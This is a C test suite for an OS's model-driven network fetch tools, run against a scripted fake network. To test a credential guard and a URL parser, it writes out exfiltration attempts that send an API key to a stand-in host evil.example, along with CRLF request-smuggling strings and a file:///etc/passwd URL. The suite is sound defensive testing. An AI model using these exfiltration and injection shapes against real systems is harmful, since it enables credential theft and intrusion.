/* test_net_tools.c — the network verbs, driven end to end with no network.
 *
 * WHAT THIS SUITE IS
 *   tools/net_tools.c and net/fetch.c are the seam where a language model's text
 *   becomes packets. Everything on the kernel side of that seam is pure logic
 *   plus ONE function-pointer boundary (fetch_backend_t, include/fetch.h), so
 *   the whole thing runs natively:
 *
 *     - the backend is FAKENET below: a scripted peer that can answer with any
 *       bytes at all, refuse a connection, time out, resolve or fail to resolve,
 *       claim any of the three TLS states, and record verbatim every byte the
 *       kernel tried to transmit;
 *     - core/tool.c is the REAL dispatcher and tools/net_tools.c is the REAL
 *       tool source, registered through the REAL linker-section registry.
 *
 *   So "the model asks for a hostile URL and the kernel refuses it with a
 *   sentence it can act on" is a test, not a story — and it needs no network, no
 *   API key and no QEMU boot.
 *
 * THE LOAD-BEARING ASSERTIONS
 *   `fake.leaked` — FAKENET scans EVERY transmitted byte for the secret the
 *   suite installed as this machine's API key. It must be zero at the end of the
 *   suite, including after the fuzzer has thrown thousands of malformed calls at
 *   every tool. That is a mechanical proof of the claim in include/fetch.h
 *   DECISION 2: no argument the model can supply causes the key to leave.
 *
 *   `fake.sends` vs the refusal count — a refused fetch must not merely fail, it
 *   must not have CONNECTED. The suite asserts the transmit counter does not
 *   move across a FETCH_ESECRET, so "refused" means "no packet", not "packet
 *   sent and then an error printed".
 *
 *   Exactly one trace line per dispatched call, for every tool and every failure
 *   path. The trace line is this kernel's ground truth (include/trace.h) and a
 *   tool that emits two, or none, breaks the record.
 *
 * WHAT THIS SUITE CANNOT PROVE
 *   That lwIP and mbedTLS behave as FAKENET does. The real backend is net/net.c
 *   and only a boot exercises it; what is proved here is that when those bytes
 *   arrive, or fail to, the kernel does exactly this.
 */

#include "harness.h"

#include "tool.h"
#include "trace.h"
#include "json.h"
#include "fetch.h"
#include "vfs.h"
#include "fs.h"

#include <stdlib.h>
#include <string.h>

/* ====================================================================== */
/* FAKENET — the scripted peer                                            */
/* ====================================================================== */

#define FAKE_TX_MAX  16384
#define FAKE_RX_MAX  65536

static struct {
    /* what the backend should do */
    int      resolve_rc;                 /* FETCH_OK / FETCH_EDNS            */
    char     resolve_to[FETCH_IP_MAX];
    int      exchange_rc;                /* FETCH_OK / ECONNECT / ETLS / ... */
    int      probe_rc;
    int      tls_state;
    char     tls_note[FETCH_NOTE_MAX];
    char     err[160];
    char     rx[FAKE_RX_MAX];
    size_t   rx_len;                     /* bytes the peer wants to send     */
    uint32_t elapsed_ms;
    int      no_nic;

    /* what actually happened */
    int      resolves, sends, probes, ifstats;
    char     last_host[FETCH_HOST_MAX];
    char     last_ip[FETCH_IP_MAX];
    uint16_t last_port;
    int      last_was_tls;
    char     last_sni[FETCH_HOST_MAX];
    char     tx[FAKE_TX_MAX + 1];
    size_t   tx_len;
    size_t   last_rx_cap;
    uint32_t last_timeout;

    /* MUST STAY ZERO */
    int      leaked;
} fake;

/* The secret this machine is pretending to hold. Not a real key and shaped
 * unlike one on purpose: the "sk-ant-" rule would catch a realistic string for
 * the WRONG reason, and then the verbatim-key half of the guard would be
 * untested. Both halves are exercised separately below. */
static const char *FAKE_KEY =
    "FABLEOS-TEST-SECRET-0000-not-a-real-credential-0000";
static int key_installed = 1;

static const char *fake_secret(void) { return key_installed ? FAKE_KEY : ""; }

static void fake_reset(void) {
    int leaked = fake.leaked;            /* survives a reset; it is cumulative */
    memset(&fake, 0, sizeof fake);
    fake.leaked = leaked;
    fake.resolve_rc = FETCH_OK;
    fake.exchange_rc = FETCH_OK;
    fake.probe_rc = FETCH_OK;
    fake.tls_state = FETCH_TLS_UNVERIFIED;
    strcpy(fake.resolve_to, "203.0.113.7");
    strcpy(fake.tls_note, "test peer");
    fake.elapsed_ms = 42;
}

static void fake_reply(const char *s) {
    size_t n = strlen(s);
    if (n > FAKE_RX_MAX) n = FAKE_RX_MAX;
    memcpy(fake.rx, s, n);
    fake.rx_len = n;
}

/* THE ASSERTION THIS WHOLE SUITE RESTS ON. Anything the kernel hands the wire
 * is searched for the installed secret before it is counted as sent. */
static void record_tx(const char *req, size_t len) {
    if (key_installed && len >= strlen(FAKE_KEY)) {
        size_t kl = strlen(FAKE_KEY);
        for (size_t i = 0; i + kl <= len; i++)
            if (memcmp(req + i, FAKE_KEY, kl) == 0) { fake.leaked++; break; }
    }
    size_t n = len < FAKE_TX_MAX ? len : FAKE_TX_MAX;
    memcpy(fake.tx, req, n);
    fake.tx[n] = '\0';
    fake.tx_len = len;
}

static int fk_resolve(const char *host, char *ip, size_t ipcap,
                      uint32_t timeout_ms) {
    fake.resolves++;
    fake.last_timeout = timeout_ms;
    snprintf(fake.last_host, sizeof fake.last_host, "%s", host ? host : "");
    if (fake.no_nic) return FETCH_ECONNECT;
    if (fake.resolve_rc != FETCH_OK) return fake.resolve_rc;
    snprintf(ip, ipcap, "%s", fake.resolve_to);
    return FETCH_OK;
}

static int fk_exchange(const fetch_conn_t *c, fetch_wire_t *w) {
    fake.sends++;
    fake.last_port    = c->port;
    fake.last_was_tls = c->sni != NULL;
    fake.last_rx_cap  = c->rx_cap;
    fake.last_timeout = c->timeout_ms;
    snprintf(fake.last_ip, sizeof fake.last_ip, "%s", c->ip ? c->ip : "");
    snprintf(fake.last_sni, sizeof fake.last_sni, "%s", c->sni ? c->sni : "");
    record_tx(c->req, c->req_len);

    w->elapsed_ms = fake.elapsed_ms;
    w->tls        = c->sni ? fake.tls_state : FETCH_TLS_NONE;
    snprintf(w->tls_note, sizeof w->tls_note, "%s", fake.tls_note);

    if (fake.no_nic) { w->err = "no link"; return FETCH_ECONNECT; }
    if (fake.exchange_rc != FETCH_OK) {
        w->err = fake.err[0] ? fake.err : "scripted failure";
        return fake.exchange_rc;
    }

    size_t n = fake.rx_len;
    if (n > c->rx_cap - 1) { n = c->rx_cap - 1; w->overflow = 1; }
    memcpy(c->rx, fake.rx, n);
    w->rx_len = n;
    return FETCH_OK;
}

static int fk_probe(const char *ip, uint16_t port, uint32_t timeout_ms,
                    fetch_wire_t *w) {
    fake.probes++;
    fake.last_port = port;
    fake.last_timeout = timeout_ms;
    snprintf(fake.last_ip, sizeof fake.last_ip, "%s", ip ? ip : "");
    w->elapsed_ms = fake.elapsed_ms;
    if (fake.no_nic) { w->err = "no link"; return FETCH_ECONNECT; }
    if (fake.probe_rc != FETCH_OK) { w->err = "connection refused"; }
    return fake.probe_rc;
}

static int fk_ifstat(fetch_ifstat_t *out) {
    fake.ifstats++;
    out->have_nic = !fake.no_nic;
    out->link_up  = !fake.no_nic;
    out->stack_up = 1;
    out->mac[0] = 0x52; out->mac[1] = 0x54; out->mac[2] = 0x00;
    out->mac[3] = 0x12; out->mac[4] = 0x34; out->mac[5] = 0x56;
    strcpy(out->ifname, "en0");
    strcpy(out->ip, "10.0.2.15");
    strcpy(out->netmask, "255.255.255.0");
    strcpy(out->gateway, "10.0.2.2");
    strcpy(out->dns, "10.0.2.3");
    strcpy(out->api_host, "api.anthropic.com");
    out->api_resolved = 1;
    strcpy(out->api_ip, "160.79.104.10");
    out->verify_build = 0;
    out->trust_roots  = 3;
    return FETCH_OK;
}

static const fetch_backend_t FAKENET = {
    "fakenet", fk_resolve, fk_exchange, fk_probe, fk_ifstat
};

/* ====================================================================== */
/* dispatch helper                                                        */
/* ====================================================================== */

static char res_buf[TOOL_RESULT_MAX];

static const char *call_json(const char *name, const char *input,
                             tool_result_t *r) {
    tool_call_t c;
    c.id        = "toolu_test";
    c.name      = name;
    c.input     = input;
    c.input_len = strlen(input);
    tool_result_init(r, res_buf, sizeof res_buf);
    tool_dispatch(&c, r);
    return res_buf;
}

/* Same, but with an explicit span length so a non-NUL-terminated input (the
 * real contract — tool.h says input spans are NOT terminated) is exercised. */
static const char *call_span(const char *name, const char *input, size_t len,
                             tool_result_t *r) {
    tool_call_t c;
    c.id        = "toolu_test";
    c.name      = name;
    c.input     = input;
    c.input_len = len;
    tool_result_init(r, res_buf, sizeof res_buf);
    tool_dispatch(&c, r);
    return res_buf;
}

/* ====================================================================== */
/* 1. URL parsing                                                         */
/* ====================================================================== */

static void test_url_good(void) {
    fetch_url_t u;
    const char *why = NULL;

    CHECK_EQ(fetch_url_parse("http://example.com", 18, &u, &why), FETCH_OK);
    CHECK_EQ(u.https, 0);
    CHECK_STR(u.host, "example.com");
    CHECK_EQ(u.port, 80);
    CHECK_STR(u.path, "/");
    CHECK_EQ(u.explicit_port, 0);

    CHECK_EQ(fetch_url_parse("https://Example.COM/a/b?c=d#frag", 32, &u, &why),
             FETCH_OK);
    CHECK_EQ(u.https, 1);
    CHECK_STR(u.host, "example.com");           /* lowercased */
    CHECK_EQ(u.port, 443);
    CHECK_STR(u.path, "/a/b?c=d");              /* fragment dropped */

    CHECK_EQ(fetch_url_parse("HTTP://h.example:8080/x", 23, &u, &why), FETCH_OK);
    CHECK_EQ(u.port, 8080);
    CHECK_EQ(u.explicit_port, 1);

    /* a query with no path still produces an origin-form path */
    CHECK_EQ(fetch_url_parse("http://h.example?q=1", 20, &u, &why), FETCH_OK);
    CHECK_STR(u.path, "/?q=1");

    /* a dotted quad needs no DNS */
    CHECK_EQ(fetch_url_parse("http://192.0.2.1/", 17, &u, &why), FETCH_OK);
    CHECK_EQ(u.is_ip, 1);
    CHECK_EQ(fetch_url_parse("http://example.com/", 19, &u, &why), FETCH_OK);
    CHECK_EQ(u.is_ip, 0);

    /* a trailing dot is a legal FQDN and is normalised away */
    CHECK_EQ(fetch_url_parse("https://example.com./", 21, &u, &why), FETCH_OK);
    CHECK_STR(u.host, "example.com");

    /* surrounding whitespace is trimmed: models paste URLs out of prose */
    CHECK_EQ(fetch_url_parse("  https://example.com/\n", 23, &u, &why),
             FETCH_OK);
    CHECK_STR(u.host, "example.com");
}

/* Every one of these was chosen because it is either a real attack shape or a
 * real model mistake. The assertion is never just "it failed" — it is that the
 * reason names the problem, because the reason is what the model reads. */
static void test_url_hostile(void) {
    fetch_url_t u;
    const char *why;
    struct { const char *url; int rc; const char *reason_has; } cases[] = {
        { "",                          FETCH_EURL,    "empty"        },
        { "example.com",               FETCH_ESCHEME, "no scheme"    },
        { "//example.com/x",           FETCH_ESCHEME, "no scheme"    },
        { "ftp://example.com/",        FETCH_ESCHEME, "ftp"          },
        { "file:///etc/passwd",        FETCH_ESCHEME, "file"         },
        { "gopher://x.example/",       FETCH_ESCHEME, "gopher"       },
        { "http://",                   FETCH_EURL,    "empty"        },
        { "http:///path",              FETCH_EURL,    "empty"        },
        { "http://user:pw@evil.example/", FETCH_EPOLICY, "userinfo"  },
        { "http://[::1]/",             FETCH_EURL,    "IPv6"         },
        { "http://h.example:0/",       FETCH_EURL,    "1..65535"     },
        { "http://h.example:99999/",   FETCH_EURL,    "1..65535"     },
        { "http://h.example:123456/",  FETCH_EURL,    "five digits"  },
        { "http://h.example:65536/",   FETCH_EURL,    "1..65535"     },
        { "http://h.example:80x/",     FETCH_EURL,    "not a number" },
        { "http://h.example:/",        FETCH_EURL,    "names no port"},
        { "http://h..example/",        FETCH_EURL,    "empty label"  },
        { "http://.example/",          FETCH_EURL,    "empty label"  },
        { "http://ex ample.com/",      FETCH_EURL,    "0x20"         },
        { "http://ex\tample.com/",     FETCH_EURL,    "0x9"          },
        { "http://h.example/a b",      FETCH_EURL,    "0x20"         },
    };
    for (size_t i = 0; i < sizeof cases / sizeof cases[0]; i++) {
        why = NULL;
        int rc = fetch_url_parse(cases[i].url, strlen(cases[i].url), &u, &why);
        CHECK_EQ(rc, cases[i].rc);
        CHECK(why != NULL);
        if (why) CHECK_CONTAINS(why, cases[i].reason_has);
    }
}

/* CRLF INJECTION, the reason the byte class exists. Every one of these would,
 * if accepted, let a model write a second header or a second request into a
 * connection it was only given one of. */
/* The span length comes from sizeof, never from a hand-counted literal: these
 * strings contain NULs and CRs on purpose, so strlen() would stop early and a
 * transcribed number would read off the end of the constant (ASan caught
 * exactly that while this test was being written). */
#define SPAN(lit) { (lit), sizeof(lit) - 1 }

static void test_url_crlf_injection(void) {
    fetch_url_t u;
    const char *why;
    static const struct { const char *s; size_t n; } evil[] = {
        SPAN("http://h.example/\r\nX-Injected: 1"),
        SPAN("http://h.example/\nX-Injected: 1"),
        SPAN("http://h.exa\rmple/"),
        SPAN("http://h.example/a\r\n\r\nGET /admin HTTP/1.0\r\n"),
        SPAN("http://h.example/\x00/x"),
        SPAN("http://h.example\r\n:80/"),
        SPAN("http://h.example/?a=1\r\nHost: evil.example"),
    };
    for (size_t i = 0; i < sizeof evil / sizeof evil[0]; i++) {
        why = NULL;
        CHECK_EQ(fetch_url_parse(evil[i].s, evil[i].n, &u, &why), FETCH_EURL);
        CHECK(why != NULL);
    }
}

static void test_url_absurd_sizes(void) {
    static char big[FETCH_URL_MAX + 4096];
    fetch_url_t u;
    const char *why;

    /* a 10 KB path */
    memcpy(big, "http://h.example/", 17);
    memset(big + 17, 'a', sizeof big - 18);
    big[sizeof big - 1] = '\0';
    why = NULL;
    CHECK_EQ(fetch_url_parse(big, strlen(big), &u, &why), FETCH_EURL);
    CHECK_CONTAINS(why, "the limit is");

    /* a path that is long but the URL is legal: ENOSPC names the path bound */
    memcpy(big, "http://h.example/", 17);
    memset(big + 17, 'a', FETCH_PATH_MAX + 8);
    big[17 + FETCH_PATH_MAX + 8] = '\0';
    why = NULL;
    CHECK_EQ(fetch_url_parse(big, strlen(big), &u, &why), FETCH_ENOSPC);
    CHECK_CONTAINS(why, "path");

    /* a 400-byte hostname */
    memcpy(big, "http://", 7);
    memset(big + 7, 'h', 400);
    memcpy(big + 407, "/", 2);
    why = NULL;
    CHECK_EQ(fetch_url_parse(big, strlen(big), &u, &why), FETCH_EURL);
    CHECK_CONTAINS(why, "253");

    /* a single label of 64 */
    memcpy(big, "http://", 7);
    memset(big + 7, 'h', 64);
    memcpy(big + 71, ".example/", 10);
    why = NULL;
    CHECK_EQ(fetch_url_parse(big, strlen(big), &u, &why), FETCH_EURL);
    CHECK_CONTAINS(why, "63");
}

/* ====================================================================== */
/* 2. request assembly                                                    */
/* ====================================================================== */

static void test_build_request(void) {
    fetch_url_t     u;
    fetch_options_t o;
    char            req[4096];
    const char     *why = NULL;

    CHECK_EQ(fetch_url_parse("https://example.com/a?b=c", 25, &u, &why),
             FETCH_OK);
    memset(&o, 0, sizeof o);
    int n = fetch_build_request(req, sizeof req, &u, &o);
    CHECK(n > 0);
    CHECK_CONTAINS(req, "GET /a?b=c HTTP/1.0\r\n");
    CHECK_CONTAINS(req, "Host: example.com\r\n");
    CHECK_CONTAINS(req, "Connection: close\r\n");
    /* the default port is NOT repeated in Host: */
    CHECK(strstr(req, "Host: example.com:443") == NULL);

    /* a non-default port is */
    CHECK_EQ(fetch_url_parse("http://example.com:8080/", 24, &u, &why),
             FETCH_OK);
    CHECK(fetch_build_request(req, sizeof req, &u, &o) > 0);
    CHECK_CONTAINS(req, "Host: example.com:8080\r\n");

    /* a body sets Content-Length and Content-Type */
    o.method = "post";                   /* case-insensitive, normalised up */
    o.body = "{\"a\":1}";
    o.body_len = 7;
    CHECK(fetch_build_request(req, sizeof req, &u, &o) > 0);
    CHECK_CONTAINS(req, "POST / HTTP/1.0\r\n");
    CHECK_CONTAINS(req, "Content-Length: 7\r\n");
    CHECK_CONTAINS(req, "Content-Type: application/json\r\n");
    CHECK_CONTAINS(req, "\r\n\r\n{\"a\":1}");

    /* the method allowlist */
    o.body = NULL; o.body_len = 0;
    static const char *bad[] = { "TRACE", "CONNECT", "GET /x HTTP/1.0",
                                 "GET\r\nX: 1", "", " GET" };
    for (size_t i = 0; i < sizeof bad / sizeof bad[0]; i++) {
        o.method = bad[i];
        int rc = fetch_build_request(req, sizeof req, &u, &o);
        if (bad[i][0] == '\0') CHECK(rc > 0);     /* "" means default GET */
        else                   CHECK_EQ(rc, FETCH_EINVAL);
    }

    /* an oversized body is refused before assembly */
    o.method = "PUT";
    o.body = req;                        /* any pointer; only the length matters */
    o.body_len = FETCH_BODY_MAX + 1;
    CHECK_EQ(fetch_build_request(req, sizeof req, &u, &o), FETCH_ENOSPC);

    /* a destination buffer that cannot hold the request */
    o.body = NULL; o.body_len = 0; o.method = NULL;
    char tiny[8];
    CHECK_EQ(fetch_build_request(tiny, sizeof tiny, &u, &o), FETCH_ENOSPC);
}

/* ====================================================================== */
/* 3. response splitting                                                  */
/* ====================================================================== */

static void split_case(const char *raw, int want_rc, int want_status,
                       const char *want_body) {
    static char buf[8192];
    fetch_result_t r;
    size_t n = strlen(raw);
    memset(&r, 0, sizeof r);
    memcpy(buf, raw, n + 1);
    int rc = fetch_split_response(buf, n, &r);
    CHECK_EQ(rc, want_rc);
    if (rc != FETCH_OK) return;
    CHECK_EQ(r.http_status, want_status);
    if (want_body) CHECK_STR(r.body, want_body);
}

static void test_split_response(void) {
    split_case("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nhello",
               FETCH_OK, 200, "hello");
    split_case("HTTP/1.0 404 Not Found\r\n\r\n", FETCH_OK, 404, "");
    /* headers but no blank line: not an error, just no body */
    split_case("HTTP/1.1 500 Oops\r\nServer: x\r\n", FETCH_OK, 500, "");

    /* malformed status lines */
    split_case("garbage with no CRLF", FETCH_EPROTO, 0, NULL);
    split_case("HTTP/1.1\r\n\r\n", FETCH_EPROTO, 0, NULL);
    split_case("HTTP/1.1 20 OK\r\n\r\n", FETCH_EPROTO, 0, NULL);
    /* FOUR digits must be refused: an unbounded run is how a status code wraps
     * into something that compares equal to 200. */
    split_case("HTTP/1.1 2000 OK\r\n\r\n", FETCH_EPROTO, 0, NULL);
    split_case("HTTP/1.1 99999999999999999999 OK\r\n\r\n", FETCH_EPROTO, 0, NULL);

    /* Location is captured and reported, case-insensitively */
    {
        static char buf[512];
        fetch_result_t r;
        const char *raw = "HTTP/1.1 301 Moved\r\nLOCATION:  https://b.example/x"
                          "\r\nX: y\r\n\r\n";
        memset(&r, 0, sizeof r);
        strcpy(buf, raw);
        CHECK_EQ(fetch_split_response(buf, strlen(raw), &r), FETCH_OK);
        CHECK_EQ(r.http_status, 301);
        CHECK_STR(r.location, "https://b.example/x");
    }

    /* a body containing NULs keeps its real length */
    {
        static char buf[512];
        fetch_result_t r;
        const char hdr[] = "HTTP/1.1 200 OK\r\n\r\n";
        size_t hn = sizeof hdr - 1;
        memcpy(buf, hdr, hn);
        buf[hn] = 'a'; buf[hn + 1] = '\0'; buf[hn + 2] = 'b';
        memset(&r, 0, sizeof r);
        CHECK_EQ(fetch_split_response(buf, hn + 3, &r), FETCH_OK);
        CHECK_EQ((long)r.body_len, 3);
    }
}

/* ====================================================================== */
/* 4. the credential guard                                                */
/* ====================================================================== */

static void test_scan_secret(void) {
    char buf[512];

    CHECK_EQ(fetch_scan_secret("nothing to see here", 19), 0);
    CHECK_EQ(fetch_scan_secret(NULL, 0), 0);
    CHECK_EQ(fetch_scan_secret("", 0), 0);

    /* the live key, anywhere in the buffer */
    snprintf(buf, sizeof buf, "GET /x?k=%s HTTP/1.0", FAKE_KEY);
    CHECK_EQ(fetch_scan_secret(buf, strlen(buf)), 1);
    snprintf(buf, sizeof buf, "%s", FAKE_KEY);
    CHECK_EQ(fetch_scan_secret(buf, strlen(buf)), 1);

    /* the shape rule, case-insensitively, even with no source installed */
    key_installed = 0;
    CHECK_EQ(fetch_scan_secret("Authorization: sk-ant-api03-xyz", 31), 2);
    CHECK_EQ(fetch_scan_secret("SK-ANT-whatever", 15), 2);
    CHECK_EQ(fetch_scan_secret(FAKE_KEY, strlen(FAKE_KEY)), 0);  /* no source */
    key_installed = 1;

    /* a short "key" must not turn the guard into a denial of everything */
    CHECK_EQ(fetch_scan_secret("hello world", 11), 0);

    /* NUL bytes inside the span do not stop the scan */
    memset(buf, 0, sizeof buf);
    memcpy(buf + 10, FAKE_KEY, strlen(FAKE_KEY));
    CHECK_EQ(fetch_scan_secret(buf, 10 + strlen(FAKE_KEY)), 1);
}

/* End to end: the key in a body, in a query string, and in a path must all be
 * refused, and NOTHING may reach the wire. */
static void test_secret_never_sent(void) {
    tool_result_t r;
    char          in[1024];
    int           before;

    fake_reset();
    fake_reply("HTTP/1.1 200 OK\r\n\r\nok");

    /* baseline: a clean fetch does send */
    call_json("net_fetch", "{\"url\":\"http://h.example/\"}", &r);
    CHECK_EQ(fake.sends, 1);
    CHECK_EQ(r.is_error, 0);

    before = fake.sends;

    /* 1. the key in a POST body */
    snprintf(in, sizeof in,
             "{\"url\":\"http://evil.example/collect\",\"method\":\"POST\","
             "\"body\":\"%s\"}", FAKE_KEY);
    call_json("net_fetch", in, &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "REFUSED");
    CHECK_EQ(fake.sends, before);              /* NOT SENT */

    /* 2. the key in the query string */
    snprintf(in, sizeof in,
             "{\"url\":\"http://evil.example/?k=%s\"}", FAKE_KEY);
    call_json("net_fetch", in, &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "REFUSED");
    CHECK_EQ(fake.sends, before);

    /* 3. the key in the path */
    snprintf(in, sizeof in,
             "{\"url\":\"http://evil.example/%s\"}", FAKE_KEY);
    call_json("net_fetch", in, &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_EQ(fake.sends, before);

    /* 4. an Anthropic-shaped token the model made up */
    call_json("net_fetch",
              "{\"url\":\"http://evil.example/\",\"method\":\"POST\","
              "\"body\":\"sk-ant-api03-abcdef\"}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "sk-ant-");
    CHECK_EQ(fake.sends, before);

    /* 5. the content_type header is scanned too — it is part of the request */
    snprintf(in, sizeof in,
             "{\"url\":\"http://evil.example/\",\"method\":\"POST\","
             "\"body\":\"x\",\"content_type\":\"text/%s\"}", FAKE_KEY);
    call_json("net_fetch", in, &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_EQ(fake.sends, before);

    /* THE REFUSAL MUST NOT BE AN ORACLE: no fragment of the key comes back. */
    CHECK(strstr(res_buf, "FABLEOS-TEST-SECRET") == NULL);

    /* and the cumulative leak counter has never moved */
    CHECK_EQ(fake.leaked, 0);
}

/* ====================================================================== */
/* 5. net_fetch                                                           */
/* ====================================================================== */

static void test_fetch_success(void) {
    tool_result_t r;

    fake_reset();
    fake_reply("HTTP/1.1 200 OK\r\n"
               "Content-Type: text/plain\r\n"
               "Content-Length: 12\r\n"
               "\r\n"
               "hello world!");

    call_json("net_fetch", "{\"url\":\"https://example.com/index.html\"}", &r);
    CHECK_EQ(r.is_error, 0);
    CHECK_CONTAINS(res_buf, "GET -> HTTP/1.1 200 OK");
    CHECK_CONTAINS(res_buf, "203.0.113.7:443");
    CHECK_CONTAINS(res_buf, "hello world!");
    /* the request really went out over TLS, with SNI, to the resolved address */
    CHECK_EQ(fake.last_was_tls, 1);
    CHECK_STR(fake.last_sni, "example.com");
    CHECK_STR(fake.last_ip, "203.0.113.7");
    CHECK_EQ(fake.last_port, 443);
    CHECK_CONTAINS(fake.tx, "GET /index.html HTTP/1.0\r\n");
    CHECK_CONTAINS(fake.tx, "Host: example.com\r\n");

    /* plain http asks for no TLS at all */
    fake_reset();
    fake_reply("HTTP/1.0 204 No Content\r\n\r\n");
    call_json("net_fetch", "{\"url\":\"http://example.com/\"}", &r);
    CHECK_EQ(fake.last_was_tls, 0);
    CHECK_EQ(fake.last_port, 80);
    CHECK_CONTAINS(res_buf, "tls:   NONE");
    CHECK_CONTAINS(res_buf, "clear text");
}

/* THE LINE THE MODEL MUST NOT SKIM PAST. */
static void test_fetch_reports_tls_state(void) {
    tool_result_t r;

    fake_reset();
    fake_reply("HTTP/1.1 200 OK\r\n\r\nx");
    fake.tls_state = FETCH_TLS_UNVERIFIED;
    call_json("net_fetch", "{\"url\":\"https://example.com/\"}", &r);
    CHECK_CONTAINS(res_buf, "NOT AUTHENTICATED");
    CHECK(strstr(res_buf, "VERIFIED - ") == NULL);

    fake_reset();
    fake_reply("HTTP/1.1 200 OK\r\n\r\nx");
    fake.tls_state = FETCH_TLS_VERIFIED;
    call_json("net_fetch", "{\"url\":\"https://example.com/\"}", &r);
    CHECK_CONTAINS(res_buf, "VERIFIED");
    CHECK(strstr(res_buf, "NOT AUTHENTICATED") == NULL);

    /* plain HTTP never claims either */
    fake_reset();
    fake_reply("HTTP/1.1 200 OK\r\n\r\nx");
    fake.tls_state = FETCH_TLS_VERIFIED;     /* the backend would not, but... */
    call_json("net_fetch", "{\"url\":\"http://example.com/\"}", &r);
    CHECK_CONTAINS(res_buf, "tls:   NONE");
}

static void test_fetch_truncation_is_honest(void) {
    tool_result_t r;
    static char   big[40000];

    fake_reset();
    memcpy(big, "HTTP/1.1 200 OK\r\n\r\n", 19);
    memset(big + 19, 'Z', sizeof big - 20);
    big[sizeof big - 1] = '\0';
    fake_reply(big);

    call_json("net_fetch", "{\"url\":\"http://h.example/\"}", &r);
    CHECK_EQ(r.is_error, 0);
    /* the whole body arrived (64 KiB of room), but only part is quoted */
    CHECK_CONTAINS(res_buf, "more bytes not shown");
    CHECK_CONTAINS(res_buf, "save_path");

    /* max_bytes below what the peer had: the wire truncation is reported */
    fake_reset();
    fake_reply(big);
    call_json("net_fetch",
              "{\"url\":\"http://h.example/\",\"max_bytes\":1024}", &r);
    CHECK_EQ((long)fake.last_rx_cap, 1024);
    CHECK_CONTAINS(res_buf, "TRUNCATED");
    CHECK_CONTAINS(res_buf, "max_bytes");
}

static void test_fetch_failures(void) {
    tool_result_t r;

    /* DNS */
    fake_reset();
    fake.resolve_rc = FETCH_EDNS;
    call_json("net_fetch", "{\"url\":\"http://nope.invalid/\"}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "resolve");
    CHECK_EQ(fake.sends, 0);

    /* connect refused */
    fake_reset();
    fake.exchange_rc = FETCH_ECONNECT;
    snprintf(fake.err, sizeof fake.err, "the peer reset the connection");
    call_json("net_fetch", "{\"url\":\"http://h.example:81/\"}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "reset the connection");
    CHECK_CONTAINS(res_buf, "net_status");

    /* TLS refused */
    fake_reset();
    fake.exchange_rc = FETCH_ETLS;
    snprintf(fake.err, sizeof fake.err, "certificate verification failed");
    call_json("net_fetch", "{\"url\":\"https://h.example/\"}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "certificate verification failed");

    /* timeout */
    fake_reset();
    fake.exchange_rc = FETCH_ETIMEOUT;
    call_json("net_fetch",
              "{\"url\":\"http://h.example/\",\"timeout_ms\":2500}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "timed out");
    CHECK_EQ((long)fake.last_timeout, 2500);

    /* the peer connected and said nothing */
    fake_reset();
    fake.rx_len = 0;
    call_json("net_fetch", "{\"url\":\"http://h.example/\"}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "without sending a single byte");

    /* the peer said something that is not HTTP */
    fake_reset();
    fake_reply("SSH-2.0-OpenSSH_9.6\r\n");
    call_json("net_fetch", "{\"url\":\"http://h.example:22/\"}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "not an HTTP response");

    /* no NIC at all */
    fake_reset();
    fake.no_nic = 1;
    call_json("net_fetch", "{\"url\":\"http://h.example/\"}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "net_status");

    /* no backend bound at all — the state a NIC-less boot leaves behind */
    fake_reset();
    fetch_set_backend(NULL);
    call_json("net_fetch", "{\"url\":\"http://h.example/\"}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "no network backend");
    fetch_set_backend(&FAKENET);
}

static void test_fetch_bad_arguments(void) {
    tool_result_t r;
    struct { const char *in; const char *has; } cases[] = {
        { "",                                  "JSON object"   },
        { "not json",                          "JSON object"   },
        { "[1,2,3]",                           "JSON object"   },
        { "{}",                                "url"           },
        { "{\"url\":42}",                      "must be a string" },
        { "{\"url\":null}",                    "must be a string" },
        { "{\"url\":\"h.example\"}",           "scheme"        },
        { "{\"url\":\"http://h.example/\",\"method\":\"TRACE\"}", "not allowed" },
        { "{\"url\":\"http://h.example/\",\"method\":7}", "must be a string" },
        { "{\"url\":\"http://h.example/\",\"timeout_ms\":-5}", "outside" },
        { "{\"url\":\"http://h.example/\",\"timeout_ms\":999999}", "outside" },
        { "{\"url\":\"http://h.example/\",\"max_bytes\":1}", "outside" },
        { "{\"url\":\"http://h.example/\",\"max_bytes\":\"lots\"}", "integer" },
    };
    for (size_t i = 0; i < sizeof cases / sizeof cases[0]; i++) {
        fake_reset();
        call_json("net_fetch", cases[i].in, &r);
        CHECK_EQ(r.is_error, 1);
        CHECK_CONTAINS(res_buf, cases[i].has);
        CHECK_EQ(fake.sends, 0);
    }

    /* an embedded NUL in the URL must be a refusal, not a silent truncation */
    fake_reset();
    {
        const char *in = "{\"url\":\"http://good.example/\\u0000evil\"}";
        call_json("net_fetch", in, &r);
        CHECK_EQ(r.is_error, 1);
        CHECK_CONTAINS(res_buf, "NUL");
        CHECK_EQ(fake.sends, 0);
    }
}

static void test_fetch_redirect_reported_not_followed(void) {
    tool_result_t r;
    fake_reset();
    fake_reply("HTTP/1.1 302 Found\r\nLocation: http://elsewhere.example/x\r\n"
               "\r\n");
    call_json("net_fetch", "{\"url\":\"http://h.example/\"}", &r);
    CHECK_EQ(r.is_error, 0);
    CHECK_CONTAINS(res_buf, "elsewhere.example");
    CHECK_CONTAINS(res_buf, "NOT followed");
    CHECK_EQ(fake.sends, 1);            /* exactly one connection was made */
}

static void test_fetch_binary_body_is_rendered_safely(void) {
    tool_result_t r;
    char          raw[256];
    size_t        n = 0;

